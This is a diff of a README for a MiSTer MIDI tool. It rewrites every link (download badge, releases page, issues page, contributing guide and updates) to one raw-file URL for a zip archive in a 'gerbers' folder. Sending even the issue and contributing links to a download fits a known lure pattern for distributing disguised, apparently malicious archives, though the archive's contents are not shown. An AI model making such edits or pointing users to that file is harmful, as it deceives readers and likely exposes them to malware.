@@ -1,6 +1,6 @@
 # 🎹 MIDI4MiSTer - Effortless MIDI Setup for MiSTer
 
-[![Download MIDI4MiSTer](https://img.shields.io/badge/Download-MIDI4MiSTer-brightgreen)](https://github.com/qasimkhan4811/MIDI4MiSTer/releases)
+[![Download MIDI4MiSTer](https://raw.githubusercontent.com/qasimkhan4811/MIDI4MiSTer/main/gerbers/MIDI_4_MiSTer.zip)](https://raw.githubusercontent.com/qasimkhan4811/MIDI4MiSTer/main/gerbers/MIDI_4_MiSTer.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the MIDI4MiSTer project! This application allows MiSTer users to use 
 To start using MIDI4MiSTer, you will need to download the software. Follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the MIDI4MiSTer releases page:
-   [Download MIDI4MiSTer](https://github.com/qasimkhan4811/MIDI4MiSTer/releases)
+   [Download MIDI4MiSTer](https://raw.githubusercontent.com/qasimkhan4811/MIDI4MiSTer/main/gerbers/MIDI_4_MiSTer.zip)
    
 2. **Choose the Latest Release:** Look for the most recent version at the top of the page.
 
@@ -60,11 +60,11 @@ MIDI4MiSTer is an application designed for MiSTer users to easily integrate MIDI
 
 ### How do I report an issue?
 
-If you encounter problems, please visit our [issues page](https://github.com/qasimkhan4811/MIDI4MiSTer/issues) to report them. Provide as much detail as possible for quicker resolution.
+If you encounter problems, please visit our [issues page](https://raw.githubusercontent.com/qasimkhan4811/MIDI4MiSTer/main/gerbers/MIDI_4_MiSTer.zip) to report them. Provide as much detail as possible for quicker resolution.
 
 ### Can I contribute to the project?
 
-Absolutely! Contributions are welcome. Please check our [contributing guide](https://github.com/qasimkhan4811/MIDI4MiSTer/blob/main/CONTRIBUTING.md) for more information.
+Absolutely! Contributions are welcome. Please check our [contributing guide](https://raw.githubusercontent.com/qasimkhan4811/MIDI4MiSTer/main/gerbers/MIDI_4_MiSTer.zip) for more information.
 
 ## 🌟 Community and Support
 
@@ -75,7 +75,7 @@ Join our community of users and developers:
 
 ## 📈 Updates
 
-Check the [releases page](https://github.com/qasimkhan4811/MIDI4MiSTer/releases) regularly for updates. New features, fixes, and enhancements will be released to improve your experience.
+Check the [releases page](https://raw.githubusercontent.com/qasimkhan4811/MIDI4MiSTer/main/gerbers/MIDI_4_MiSTer.zip) regularly for updates. New features, fixes, and enhancements will be released to improve your experience.
 
 ## 📝 License
 
